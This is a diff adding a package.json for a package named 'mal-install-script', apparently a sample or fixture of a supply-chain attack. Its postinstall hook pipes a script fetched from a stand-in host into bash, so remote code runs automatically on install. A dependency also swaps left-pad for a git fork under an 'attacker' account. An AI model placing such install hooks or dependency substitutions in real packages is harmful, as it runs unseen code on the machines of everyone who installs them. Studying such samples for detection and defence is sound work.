@@ -1,0 +1,10 @@
+{
+  "name": "mal-install-script",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -s https://install.example.invalid/x.sh | bash"
+  },
+  "dependencies": {
+    "left-pad": "git+https://github.com/attacker/left-pad.git"
+  }
+}
